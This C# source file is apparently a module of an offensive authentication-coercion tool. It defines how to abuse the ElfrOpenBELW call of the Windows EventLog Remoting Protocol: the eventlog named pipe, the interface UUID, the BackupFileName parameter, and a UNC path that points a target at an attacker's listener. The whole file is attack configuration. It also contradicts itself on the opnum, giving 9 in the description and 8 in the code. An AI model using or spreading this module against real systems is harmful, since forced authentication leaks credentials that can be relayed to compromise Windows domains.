using Coercer_dotnet.structures;

namespace Coercer_dotnet.methods.MS_EVEN
{
    public class ElfrOpenBELW : MS_EVEN
    {
        public override string Description => "Coercing a machine to authenticate using function [ElfrOpenBELW](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1) (opnum 9) of [MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)";
        public override string Author => "@evilashz";
        public override ExploitPath[] ExploitPaths => new ExploitPath[] { new(AuthType.SMB, "\\??\\UNC\\{{listener}}{{port}}\\{{8}}\\aa") };
        public override NcanNpAccess[] NcanNpAccesses => new NcanNpAccess[] { new("\\PIPE\\eventlog", "82273fdc-e32a-18c3-3f78-827929dc23ea", "0.0") };
        public override NcacnIpTcpAccess[] NcacnIpTcpAccesses => new NcacnIpTcpAccess[] { new("82273fdc-e32a-18c3-3f78-827929dc23ea", "0.0") };
        public override Protocol Protocol => new("[MS-EVEN]: EventLog Remoting Protocol", "MS-EVEN");
        public override Function Function => new("ElfrOpenBELW", 8, new[] { "BackupFileName" });

        // public override void Trigger() { }
    }
}